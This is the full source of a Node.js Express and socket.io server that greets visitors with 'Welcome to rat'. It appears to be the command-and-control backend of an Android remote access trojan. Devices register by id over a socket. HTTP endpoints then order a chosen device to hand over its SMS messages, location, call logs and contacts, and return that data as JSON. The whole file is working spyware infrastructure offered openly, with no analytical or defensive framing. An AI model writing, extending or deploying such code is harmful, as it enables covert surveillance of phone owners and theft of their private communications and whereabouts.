const express = require('express');
const socketToId = new Map(); //socket.id to id
const idToSocket = new Map(); //mobileid to socket.id
const idToConnectionSocket = new Map(); //mobileid to socket
const { createServer } = require('http');
const socketIo = require('socket.io');
const cors = require('cors');

const app = express();

app.use(cors({
    origin: '*',
}));

const server = createServer(app);
const io = socketIo(server,{
    cors: {
      origin: '*',
      methods: ['GET', 'POST'],
    },
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.send("Welcome to rat");
});

app.get('/sms/:id', async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('sms', "get sms");
    try{
    const smsData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("sms", (data) => {
          resolve({"sms":data});
        });
      });
      // Send the received 'smsData' as a JSON response
      res.json(smsData);
    }catch(e){
        res.json(e);
    }
});

app.get('/location/:id', async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('location', "get location");
    try{
    const locationData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("location", (data) => {
          resolve({"location":data});
        });
      });
      // Send the received 'smsData' as a JSON response
      res.json(locationData);
    }catch(e){
        res.json(e);
    }
});

app.get('/calls/:id', async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('calllogs', "get callLogs");
    try{
    const locationData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("calllogs", (data) => {
          resolve({"call_logs":data});
        });
      });
      // Send the received 'smsData' as a JSON response
      res.json(locationData);
    }catch(e){
        res.json(e);
    }
});

app.get('/contacts/:id', async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('contacts', "get contacts");
    try{
    const locationData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("contacts", (data) => {
          resolve({"contacts":data});
        });
      });
      // Send the received 'smsData' as a JSON response
      res.json(locationData);
    }catch(e){
        res.json(e);
    }
});

//io operations
io.on("connection", (socket) => {
    socket.on("register", (id) => {
        socketToId.set(socket.id, id);
        idToSocket.set(id, socket.id);
        idToConnectionSocket.set(id, socket);
        console.log("registered");
    });
    socket.on("disconnect", () => {
        var id = socketToId.get(socket.id);
        socketToId.delete(socket.id);
        idToSocket.delete(id);
        idToConnectionSocket.delete(id);
        console.log("user disconnected");
        console.log(socketToId, idToSocket, idToConnectionSocket);
    });
});
// Start the server
const PORT = process.env.PORT || 8000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
